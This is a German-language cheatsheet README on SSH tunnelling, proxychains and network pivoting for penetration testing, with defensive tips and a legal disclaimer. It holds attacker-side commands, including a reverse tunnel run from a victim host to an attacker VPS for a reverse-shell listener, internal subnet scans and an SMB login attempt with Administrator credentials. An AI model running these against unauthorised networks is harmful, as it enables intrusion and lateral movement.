<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🚇 SSH-Tunneling und Proxychains – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗███████╗██╗  ██╗    ████████╗██╗   ██╗███╗   ██╗███╗   ██╗███████╗██╗     
  ██╔════╝██╔════╝██║  ██║    ╚══██╔══╝██║   ██║████╗  ██║████╗  ██║██╔════╝██║     
  ███████╗███████╗███████║       ██║   ██║   ██║██╔██╗ ██║██╔██╗ ██║█████╗  ██║     
  ╚════██║╚════██║██╔══██║       ██║   ██║   ██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║     
  ███████║███████║██║  ██║       ██║   ╚██████╔╝██║ ╚████║██║ ╚████║███████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚══════╝
       Pivoting, Port Forwarding (-L, -R, -D) & Proxychains Integration
```
<p align="center">
  <img src="https://img.shields.io/badge/SSH-Tunneling_&_Pivoting-blue?style=for-the-badge" alt="SSH-Tunneling">
  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunnels-green?style=for-the-badge" alt="Pivoting">
  <img src="https://img.shields.io/badge/Integration-Proxychains--ng-orange?style=for-the-badge" alt="Proxychains">
  <img src="https://img.shields.io/badge/Protocol-SSH_SOCKS5-purple?style=for-the-badge" alt="SOCKS5">
</p>

<p align="center">
  <b>🚇 Umfassende Referenz für lokale (-L), Remote/Reverse (-R) und dynamische SOCKS (-D) SSH-Tunnel mit Proxychains-ng-Integration</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Übersicht & Tunnelarchitekturen](#-overview--tunneling-architectures)
- [Lokale Portweiterleitung (`-L`)](#-local-port-forwarding--l)
  - [Syntax & Mechanik](#syntax--mechanics)
  - [Weiterleiten eines internen Webinterfaces](#forwarding-an-internal-web-interface)
  - [Remote-Datenbank-Ports weiterleiten](#forwarding-remote-database-ports)
- [Remote-/Reverse-Port-Weiterleitung (`-R`)](#-remote--reverse-port-forwarding--r)
  - [Syntax & Mechanik](#syntax--mechanics-1)
  - [Lokalen Reverse-Shell-Handler verfügbar machen](#exposed-local-reverse-shell-handler)
  - [Eingehenden Datenverkehr von DMZ weiterleiten](#relaying-inbound-traffic-from-dmz)
- [Dynamische SOCKS-Weiterleitung (`-D`)](#-dynamic-socks-forwarding--d)
  - [Syntax & SOCKS5-Setup](#syntax--socks5-setup)
- [Proxychains-ng-Konfiguration](#-proxychains-ng-configuration)
  - [Konfigurieren von `/etc/proxychains4.conf`](#configuring-etcproxychains4conf)
  - [CLI-Tools über Proxychains weiterleiten](#routing-cli-tools-through-proxychains)
- [Multi-Hop-Pivoting & Jump-Hosts (`-J`)](#-multi-hop-pivoting--jump-hosts--j)
- [Persistente Tunnel mit Autossh](#-persistent-tunnels-with-autossh)
- [Interaktive SSH-Escape-Sequenzen (`~C`)](#-interactive-ssh-escape-sequences-c)
- [Kurzreferenztabelle](#-quick-reference-table)
- [Verteidigungsüberlegungen und OPSEC](#-defensive-considerations--opsec)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)

---

## 🎯 Übersicht und Tunnelarchitekturen

SSH ist nicht nur ein Remote-Terminal-Client; Es handelt sich um eine verschlüsselte, bidirektionale Bytestream-Transportschicht, die restriktive Egress-/Ingress-Firewall-Richtlinien umgeht:

1. **Lokale Portweiterleitung (`-L`):** Öffnet einen Überwachungsport auf dem **lokalen Rechner des Angreifers**; Verbindungen werden über SSH getunnelt und an ein Ziel weitergeleitet, das vom Remote-SSH-Server aus erreichbar ist.
2. **Remote-Port-Weiterleitung (`-R`):** Öffnet einen Überwachungsport auf dem **Remote-SSH-Server**; Eingehende Verbindungen werden zurück zum lokalen Computer oder internen Ziel des Angreifers getunnelt.
3. **Dynamische Portweiterleitung (`-D`):** Verwandelt den SSH-Client in einen lokalen **SOCKS4/SOCKS5-Proxy** und ermöglicht Tools (Nmap, Burp Suite, Ffuf, Metasploit), beliebigen TCP-Verkehr über das Remote-Netzwerk weiterzuleiten.
```
Attacker [Kali]                  SSH Bastion / Pivot               Internal Target
 192.168.1.50   =========>       10.10.10.200 (Dual NIC)  ------>  172.16.0.15:80
   (Local)                       (SSH Server)                      (Isolated Host)
```
---

## 🔌 Lokale Portweiterleitung (`-L`)

### Syntax und Mechanik
```
ssh -L [bind_address:]<local_port>:<destination_host>:<destination_port> user@bastion
```
### Weiterleitung eines internen Webinterfaces
Greifen Sie über Pivot `10.10.10.200` auf ein Webadministrationspanel auf `172.16.0.15:80` zu:
```bash
ssh -N -L 8080:172.16.0.15:80 user@10.10.10.200
```
*Navigieren Sie nun in Ihrem lokalen Browser zu `http://127.0.0.1:8080`.*

### Weiterleitung von Remote-Datenbank-Ports
Greifen Sie auf eine interne PostgreSQL-Datenbank zu, die nur an `127.0.0.1:5432` auf dem Remote-Server gebunden ist:
```bash
ssh -N -L 5432:127.0.0.1:5432 ubuntu@target-server.com
```
> [!NOTE]
> Verwendete Flaggen:
> - `-N`: Führen Sie keinen Remote-Shell-Befehl aus (nur Tunnel).
> - `-f`: Im Hintergrund unmittelbar vor der Befehlsausführung ausführen.

---

## 🔄 Remote-/Reverse-Port-Weiterleitung (`-R`)

### Syntax und Mechanik
```
ssh -R [bind_address:]<remote_port>:<local_host>:<local_port> user@attacker_vps
```
### Lokalen Reverse-Shell-Handler verfügbar machen
Durchbrechen Sie ausgehende Firewalls von einem kompromittierten Zielcomputer hinter NAT aus, um Datenverkehr an Ihren externen Listener auf VPS zu senden:
```bash
# Executed on victim / pivot machine
ssh -N -R 4444:127.0.0.1:4444 attacker@vps.domain.com
```
### Weiterleitung des eingehenden Datenverkehrs von der DMZ
Leiten Sie Port 8080 auf dem Remote-Pivot an den lokalen Port 80 weiter:
```bash
ssh -N -R 8080:127.0.0.1:80 user@pivot.corp.local
```
> [!IMPORTANT]
> Um Remote-Ports an alle Schnittstellen (`0.0.0.0`) zu binden, muss der `/etc/ssh/sshd_config` des SSH-Servers Folgendes festlegen:
> `GatewayPorts yes` oder `GatewayPorts clientspecified`.

---

## 🌐 Dynamische SOCKS-Weiterleitung (`-D`)

### Syntax und SOCKS5-Setup
Erstellen Sie einen dynamischen SOCKS5-Proxy auf dem lokalen Port `1080`:
```bash
ssh -N -D 127.0.0.1:1080 user@pivot.corp.local
```
Stellen Sie sicher, dass der SOCKS-Proxy lauscht:
```bash
ss -tlpn | grep 1080
```
---

## ⚙️ Proxychains-ng-Konfiguration

Proxychains fängt dynamische Bibliotheksnetzwerkaufrufe (`connect()`, `gethostbyname()`) über `LD_PRELOAD` ab, um Standard-CLI-Anwendungen über SOCKS/HTTP-Proxys zu erzwingen.

### `/etc/proxychains4.conf` konfigurieren
Bearbeiten Sie die Konfigurationsdatei so, dass sie auf Ihren SSH Dynamic SOCKS-Tunnel verweist:
```ini
# Enable dynamic chain or strict chain
strict_chain

# Proxy DNS requests through proxy (prevents DNS leaks)
proxy_dns

[ProxyList]
# protocol  ip          port
socks5      127.0.0.1   1080
```
### CLI-Tools über Proxychains weiterleiten
```bash
# Nmap TCP Connect Scan (Note: SYN scans do NOT work through SOCKS proxies)
proxychains4 nmap -sT -Pn -sV 172.16.0.0/24 -p 22,80,445,3389

# Executing CrackMapExec / NetExec across internal subnet
proxychains4 nxc smb 172.16.0.100 -u 'Administrator' -p 'P@ssw0rd'

# Web fuzzing internal server
proxychains4 ffuf -u http://172.16.0.15/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
---

## 🔀 Multi-Hop-Pivoting- und Jump-Hosts (`-J`)

Beim Durchqueren mehrerer segmentierter Firewall-Grenzen:
```bash
# Jump through Bastion 1, then Bastion 2, to reach Target
ssh -J user@bastion1.corp.com:22,user@bastion2.corp.internal target-user@internal-db.corp.internal

# Dynamic SOCKS over double jump
ssh -J user@bastion1:22,user@bastion2:22 -D 1080 target-user@pivot
```
---

## 🔁 Persistente Tunnel mit Autossh

Wenn SSH-Tunnel aufgrund von Netzwerk-Timeout oder NAT-Ausfällen unterbrochen werden, überwacht `autossh` automatisch die SSH-Verbindung und startet sie neu:
```bash
# Install autossh
sudo apt install -y autossh

# Establish background auto-reconnecting SOCKS tunnel
autossh -M 0 -f -N -D 127.0.0.1:1080 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" user@pivot.corp.local
```
---

## ⌨️ Interaktive SSH-Escape-Sequenzen (`~C`)

Wenn Sie bereits eine interaktive SSH-Sitzung geöffnet haben und plötzlich eine Portweiterleitung öffnen müssen, ohne die Verbindung zu trennen:

1. Drücken Sie `Enter`
2. Geben Sie `~C` ein (Tilde gefolgt von einem großen C)
3. Die Eingabeaufforderung ändert sich zu `ssh> `
4. Fügen Sie Ihre Weiterleitungsregeln im Handumdrehen hinzu:
   ```text
   ssh> -L 8080:192.168.10.50:80
   Forwarding port.
   ```
Oder erstellen Sie dynamische SOCKS:
   ```text
   ssh> -D 1080
   ```
---

## ⚡ Kurzreferenztabelle

| Ziel | Befehl |
|-----------|---------|
| **Lokale Portweiterleitung** | `ssh -N -L <L_PORT>:<DEST_IP>:<DEST_PORT> user@pivot` |
| **Remote-Port-Weiterleitung** | `ssh -N -R <R_PORT>:<DEST_IP>:<DEST_PORT> user@vps` |
| **Dynamischer SOCKS5-Proxy**| `ssh -N -D 127.0.0.1:1080 user@pivot` |
| **Stiller Tunnel im Hintergrund** | `ssh -f -N -D 1080 user@pivot` |
| **Jump Host Pivot** | `ssh -J user@hop1,user@hop2 target` |
| **Tool über Proxychains ausführen** | `proxychains4 <TOOL> <ARGS>` |
| **Persistente automatische Neuverbindung** | `autossh -M 0 -f -N -D 1080 -o "ServerAliveInterval 30" user@pivot` |
| **On-the-Fly-Tunnel** | `Enter` dann `~C` -> `ssh> -D 1080` |

---

## 🛡️ Defensive Überlegungen und OPSEC

1. **Deaktivieren Sie die Portweiterleitung in SSHD:** Legen Sie `AllowTcpForwarding no` und `PermitTunnel no` in `/etc/ssh/sshd_config` auf gehärteten Produktionssystemen fest.
2. **Erkennung von Netzwerkflussanomalien:** Dauerhafte SSH-Sitzungen mit langer Laufzeit, die umfangreiche bidirektionale Byteströme übertragen, deuten häufig auf interaktives Tunneln oder Datenexfiltration hin.

---

## ⚠️ Rechtlicher Haftungsausschluss

> [!ACHTUNG]
> SSH-Tunneling und Netzwerk-Pivoting dürfen nur auf Netzwerken und Systemen durchgeführt werden, für die eine ausdrückliche schriftliche Genehmigung vorliegt. Das unbefugte Umgehen von Perimeternetzwerk-Firewalls ist illegal.